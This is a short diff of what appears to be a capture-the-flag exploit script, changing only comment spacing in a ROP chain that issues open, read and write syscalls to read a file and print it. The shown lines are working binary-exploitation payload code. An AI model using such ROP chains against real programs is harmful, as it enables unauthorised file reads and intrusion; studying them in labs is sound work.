@@ -58,10 +58,10 @@ syscall = readaddr + 0x10
 success("syscall -> " + hex(syscall))
 
 payload += p64(pop_rdi) + p64(bss - 0x20) + p64(pop_rsi) + p64(0)
-payload += p64(pop_rax) + p64(2) + p64(syscall) #open
+payload += p64(pop_rax) + p64(2) + p64(syscall) # open
 
 payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x50) + p64(pop_rdx) + p64(0x40)
-payload += p64(pop_rax) + p64(0) + p64(syscall) #read
+payload += p64(pop_rax) + p64(0) + p64(syscall) # read
 
 payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss + 0x50) + p64(pop_rdx) + p64(0x40)
 payload += p64(pop_rax) + p64(1) + p64(syscall) # write
